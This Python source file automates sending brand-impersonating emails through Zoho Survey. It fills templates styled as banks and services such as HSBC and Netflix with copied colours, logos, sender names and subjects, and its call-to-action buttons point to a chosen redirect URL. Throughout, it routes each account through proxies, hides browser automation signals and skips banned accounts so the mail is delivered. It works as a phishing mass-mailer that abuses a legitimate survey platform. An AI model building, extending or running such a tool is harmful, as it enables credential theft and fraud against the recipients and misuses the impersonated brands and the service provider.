"""
run_template.py — Send any of the 250 templates via Zoho Survey, on any account.

Usage:
    python run_template.py --template hsbc_bank --account assistantemarketing@qualissolutions.fr --to fat45sam@gmail.com
    python run_template.py --template netflix   --account user@domain.com --to target@gmail.com
    python run_template.py --list               # show all 250 template IDs

Logic:
  1. Load template from templates.json by ID
  2. Login to Zoho (with proxy from profiles.json)
  3. Look for existing survey named after the brand on this account
     → found + working  →  reuse it (skip creation)
     → not found        →  create new survey
  4. Configure: header color, header font, button color, button text,
                body HTML, subject, from_name, end-page redirect
  5. Send email invite
"""

import sys, os, json, time, random, re, argparse, shutil, tempfile
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

import discover_invite as DI

# ── CLI ────────────────────────────────────────────────────────────────────────
parser = argparse.ArgumentParser(description="Zoho template sender")
parser.add_argument("--template", "-t", default="hsbc_bank",
                    help="Template ID from templates.json (default: hsbc_bank)")
parser.add_argument("--account",  "-a", default=None,
                    help="Zoho account email (default: first in profiles.json)")
parser.add_argument("--to",             default="fat45sam@gmail.com",
                    help="Recipient email (default: fat45sam@gmail.com)")
parser.add_argument("--redirect",       default=None,
                    help="Override redirect URL (default: template cta_link)")
parser.add_argument("--list",           action="store_true",
                    help="List all template IDs and exit")
parser.add_argument("--no-proxy",       action="store_true",
                    help="Disable proxy (use direct connection)")
parser.add_argument("--force-new",      action="store_true",
                    help="Always create a new survey even if one exists")
args = parser.parse_args()

# ── Load templates ─────────────────────────────────────────────────────────────
TEMPLATES_FILE = os.path.join(os.path.dirname(__file__), "templates.json")
templates = json.load(open(TEMPLATES_FILE, encoding="utf-8"))

if args.list:
    print(f"\n{'ID':<30} {'Name':<40} Category")
    print("-" * 80)
    for t in templates:
        print(f"{t['id']:<30} {t['name']:<40} {t['category']}")
    print(f"\nTotal: {len(templates)} templates")
    sys.exit(0)

# Find template
tmpl = next((t for t in templates if t["id"] == args.template), None)
if not tmpl:
    # fuzzy match — try prefix or contains
    tmpl = next((t for t in templates if args.template.lower() in t["id"].lower()), None)
if not tmpl:
    print(f"Template '{args.template}' not found.")
    print("Use --list to see all IDs, or check templates.json")
    sys.exit(1)

print(f"\n{'='*60}")
print(f"Template : {tmpl['name']} [{tmpl['id']}]")
print(f"Category : {tmpl['category']}")
print(f"Colors   : {tmpl['banner1']} / {tmpl['banner2']}")
print(f"To       : {args.to}")
print(f"{'='*60}\n")

# ── Load account profile ───────────────────────────────────────────────────────
PROFILES_FILE = os.path.join(os.path.dirname(__file__), "profiles.json")
profiles = json.load(open(PROFILES_FILE, encoding="utf-8")) if os.path.exists(PROFILES_FILE) else []

if args.account:
    profile = next((p for p in profiles if p.get("email") == args.account), None)
    if not profile:
        print(f"Account '{args.account}' not in profiles.json — using with empty profile")
        profile = {"email": args.account}
else:
    # Pick first valid profile
    valid = [p for p in profiles if p.get("email") and p.get("status") != "banned"]
    if not valid:
        print("No valid profiles in profiles.json")
        sys.exit(1)
    profile = valid[0]

EMAIL_USER = profile.get("email", "")
EMAIL_PASS = profile.get("imap_password", profile.get("password", ""))
ZOHO_PW    = profile.get("zoho_password", profile.get("password", ""))
PROXY      = profile.get("proxy", "") if not args.no_proxy else ""
PORTAL     = profile.get("portal_id", "")
DEPT       = profile.get("dept_id", "")

DI.EMAIL   = EMAIL_USER
DI.PW_IMAP = EMAIL_PASS

print(f"Account  : {EMAIL_USER}")
print(f"Proxy    : {PROXY.split('@')[1] if '@' in PROXY else (PROXY or 'NONE (direct)')}")

# ── Template fields ────────────────────────────────────────────────────────────
BRAND        = tmpl.get("org_name", tmpl["name"])
BRAND_SHORT  = tmpl["name"].lstrip("🏦🏛💳🛒📦📱💙🚚📬🏥⚖️🔮👮🏢").strip()
SUBJECT      = tmpl.get("subject", f"Important Notice — {BRAND}")
FROM_NAME    = tmpl.get("from_name", BRAND)
BTN_TEXT     = tmpl.get("btn_text", "Continue")
LOGO_URL     = tmpl.get("logo_url", "")
BANNER1      = tmpl.get("banner1", "#003366")
BANNER2      = tmpl.get("banner2", "#001a33")
SURVEY_NAME  = tmpl.get("survey_name", f"{BRAND_SHORT} Notice")
REDIRECT_URL = args.redirect or tmpl.get("cta_link", "https://www.google.com")

# Luminance check for header font color
def _luminance(hex_c):
    h = hex_c.lstrip("#")
    if len(h) < 6: return 0.5
    r, g, b = int(h[0:2],16), int(h[2:4],16), int(h[4:6],16)
    return (0.299*r + 0.587*g + 0.114*b) / 255

HEADER_FONT = "000000" if _luminance(BANNER1) > 0.55 else "FFFFFF"

print(f"\nBrand    : {BRAND}")
print(f"Subject  : {SUBJECT}")
print(f"From     : {FROM_NAME}")
print(f"Button   : {BTN_TEXT}")
print(f"Header   : {BANNER1} (font={HEADER_FONT})")
print(f"Redirect : {REDIRECT_URL}")
print(f"Logo     : {LOGO_URL or '(none)'}")

# ── Chrome setup ───────────────────────────────────────────────────────────────
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager

profile_dir = tempfile.mkdtemp(prefix="zoho_tpl_")
opts = Options()
opts.add_argument(f"--user-data-dir={profile_dir}")
opts.add_argument("--no-sandbox")
opts.add_argument("--disable-dev-shm-usage")
opts.add_argument("--disable-blink-features=AutomationControlled")
opts.add_argument("--window-size=1280,900")
opts.add_experimental_option("excludeSwitches", ["enable-automation"])
opts.add_experimental_option("useAutomationExtension", False)

if PROXY:
    try:
        from zoho_sender_gui import _AuthProxyTunnel
        lp = _AuthProxyTunnel.get_port(PROXY)
        opts.add_argument(f"--proxy-server=http://127.0.0.1:{lp}")
        print(f"Proxy tunnel: :{lp}")
    except Exception as e:
        proxy_host = PROXY.rsplit("@", 1)[1] if "@" in PROXY else PROXY
        opts.add_argument(f"--proxy-server=socks5://{proxy_host}")
        print(f"Direct socks5 proxy ({e})")

d = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=opts)

def _find_existing_survey(d, portal_id, dept_id, survey_name):
    """
    Look for an existing survey matching survey_name on the dashboard.
    Returns survey_id (str) or None.
    Scans the survey cards via the Zoho API endpoint.
    """
    try:
        # Navigate to survey list page
        list_url = (f"https://survey.zoho.com/survey/newui#/portal/{portal_id}"
                    f"/department/{dept_id}/surveylist")
        d.get(list_url)
        time.sleep(5)

        # Try Zoho internal API — returns JSON list of surveys
        api_url = (f"https://survey.zoho.com/api/v1/surveys"
                   f"?portal={portal_id}&department={dept_id}&limit=100&page=1")
        result = d.execute_script(f"""
            return new Promise(function(resolve) {{
                fetch('{api_url}', {{credentials:'include'}})
                    .then(function(r){{ return r.json(); }})
                    .then(function(j){{ resolve(j); }})
                    .catch(function(e){{ resolve({{error: e.toString()}}); }});
            }});
        """)

        if isinstance(result, dict) and "data" in result:
            surveys = result["data"]
            name_lower = survey_name.lower().strip()
            for sv in surveys:
                sv_name = (sv.get("name") or sv.get("survey_name") or "").lower().strip()
                sv_id   = sv.get("id") or sv.get("survey_id") or sv.get("surveyId") or ""
                if sv_name == name_lower or sv_name.startswith(name_lower[:20]):
                    print(f"  Found existing survey: '{sv_name}' id={sv_id}")
                    return str(sv_id)

        # Fallback: scan DOM cards on the dashboard
        cards = d.execute_script("""
            var cards = [];
            document.querySelectorAll('[data-survey-id],[data-surveyid]').forEach(function(el){
                var sid = el.getAttribute('data-survey-id') || el.getAttribute('data-surveyid') || '';
                var name = el.innerText ? el.innerText.split('\\n')[0].trim() : '';
                if (sid) cards.push({id: sid, name: name});
            });
            return cards;
        """)
        if cards:
            name_lower = survey_name.lower().strip()
            for c in cards:
                if c.get("name","").lower().strip().startswith(name_lower[:20]):
                    print(f"  Found existing survey (DOM): '{c['name']}' id={c['id']}")
                    return str(c["id"])

        print(f"  No existing survey found for '{survey_name}'")
        return None

    except Exception as e:
        print(f"  Survey lookup failed: {e}")
        return None


try:
    # ── Step 0: IP check ──────────────────────────────────────────────────────
    if PROXY:
        d.get("https://api.ipify.org?format=json")
        time.sleep(3)
        ip_text = d.find_element("tag name", "body").text
        print(f"\nBrowser IP: {ip_text}")
        if "ERR_" in ip_text or "isn't working" in ip_text:
            raise RuntimeError(f"Proxy failed: {ip_text[:80]}")
        print("Proxy OK")

    # ── Step 1: Login ─────────────────────────────────────────────────────────
    print("\n[1] Logging in...")
    d.get("https://survey.zoho.com/survey/newui")
    time.sleep(4)
    DI.login_if_needed(d, email=EMAIL_USER, imap_pw=EMAIL_PASS, zoho_pw=ZOHO_PW)
    time.sleep(3)

    # Navigate to survey dashboard if redirected elsewhere
    if "survey.zoho.com" not in d.current_url:
        print("    Redirecting to survey dashboard...")
        d.get("https://survey.zoho.com/survey/newui")
        time.sleep(12)

    # ── Step 2: Auto-detect portal/dept ───────────────────────────────────────
    print("[2] Detecting portal/dept...")
    for _t in range(20):
        try:
            _p, _dep = DI.extract_portal_dept(d.current_url)
        except Exception:
            _p, _dep = None, None
        if _p:
            PORTAL, DEPT = _p, _dep
            print(f"    portal={PORTAL}  dept={DEPT}")
            break
        time.sleep(1)
    else:
        if not PORTAL:
            raise RuntimeError("Could not detect portal/dept from URL")
        print(f"    Using profile portal={PORTAL}  dept={DEPT}")

    # ── Step 3: Find or create survey ─────────────────────────────────────────
    survey_id = None

    if not args.force_new:
        print(f"\n[3] Looking for existing survey '{SURVEY_NAME}'...")
        survey_id = _find_existing_survey(d, PORTAL, DEPT, SURVEY_NAME)

    if not survey_id:
        print(f"\n[3] Creating new survey '{SURVEY_NAME}'...")
        import unittest.mock as mock
        sys.modules.setdefault("webview", mock.MagicMock())
        from zoho_sender_gui import _create_blank_survey, _add_dummy_question

        survey_id = _create_blank_survey(d, PORTAL, DEPT, survey_name=SURVEY_NAME)
        if not survey_id:
            raise RuntimeError("Survey creation failed")
        print(f"    Created: survey_id={survey_id}")

        _add_dummy_question(d, PORTAL, DEPT, survey_id)
        print("    Dummy question added")
    else:
        print(f"    Reusing survey_id={survey_id}")

    # ── Step 4: End-page redirect ──────────────────────────────────────────────
    print(f"\n[4] Setting end-page redirect → {REDIRECT_URL} ...")
    r = DI.set_survey_end_page(d, PORTAL, DEPT, survey_id,
                               end_page_type="redirect",
                               end_page_url=REDIRECT_URL)
    print(f"    Result: {r}")

    # ── Step 5: Intro page — disabled (button in email goes direct to redirect)
    try:
        DI.disable_intro_page(d, PORTAL, DEPT, survey_id)
        print("[5] Intro page disabled")
    except Exception as e:
        print(f"[5] Intro page skip: {e}")

    # ── Step 6: Build email HTML ───────────────────────────────────────────────
    print("\n[6] Building email HTML...")
    import unittest.mock as mock
    sys.modules.setdefault("webview", mock.MagicMock())
    from zoho_sender_gui import _build_email_html

    email_html = _build_email_html(tmpl, custom_link=REDIRECT_URL)
    print(f"    HTML: {len(email_html)} chars  logo={'YES' if LOGO_URL else 'NO'}")

    # ── Step 7: Send with full header + button styling ─────────────────────────
    print(f"\n[7] Sending to {args.to} ...")
    print(f"    Subject  : {SUBJECT}")
    print(f"    From     : {FROM_NAME}")
    print(f"    Button   : {BTN_TEXT} [{BANNER1}]")
    print(f"    Header   : {BANNER1} / font={HEADER_FONT}")

    ok = DI.configure_email_invite(
        d, PORTAL, DEPT, survey_id,
        subject=SUBJECT,
        body_html=email_html,
        recipients=[args.to],
        from_name=FROM_NAME,
        reply_to=EMAIL_USER,
        send_mode="now",
        survey_name=SURVEY_NAME,
        btn_label=BTN_TEXT,
        btn_color=BANNER1.lstrip("#"),
        header_title=BRAND_SHORT,
        header_bg=BANNER1.lstrip("#"),
        header_font=HEADER_FONT,
    )

    # ── Result ─────────────────────────────────────────────────────────────────
    if ok:
        # Save survey_id back to profile for reuse
        if profiles and EMAIL_USER:
            for p in profiles:
                if p.get("email") == EMAIL_USER:
                    if "surveys" not in p:
                        p["surveys"] = {}
                    p["surveys"][tmpl["id"]] = survey_id
                    p["portal_id"] = PORTAL
                    p["dept_id"]   = DEPT
                    break
            json.dump(profiles, open(PROFILES_FILE, "w", encoding="utf-8"),
                      ensure_ascii=False, indent=2)
            print(f"\n    Saved survey_id to profiles.json for reuse")

        print(f"\n{'='*60}")
        print(f"✓ SUCCESS")
        print(f"  Template : {tmpl['name']} [{tmpl['id']}]")
        print(f"  To       : {args.to}")
        print(f"  Subject  : {SUBJECT}")
        print(f"  From     : {FROM_NAME}")
        print(f"  Button   : {BTN_TEXT} [{BANNER1}]")
        print(f"  Redirect : {REDIRECT_URL}")
        print(f"  Account  : {EMAIL_USER}")
        print(f"  Survey   : {survey_id}")
        print(f"{'='*60}")
    else:
        print(f"\n{'='*60}")
        print(f"✗ FAILED — check screenshots in current directory")
        print(f"{'='*60}")

except KeyboardInterrupt:
    print("\nInterrupted by user")
except Exception as e:
    import traceback
    print(f"\nERROR: {e}")
    traceback.print_exc()
finally:
    try:
        time.sleep(4)
        d.quit()
    except: pass
    shutil.rmtree(profile_dir, ignore_errors=True)
    print("\nDone.")
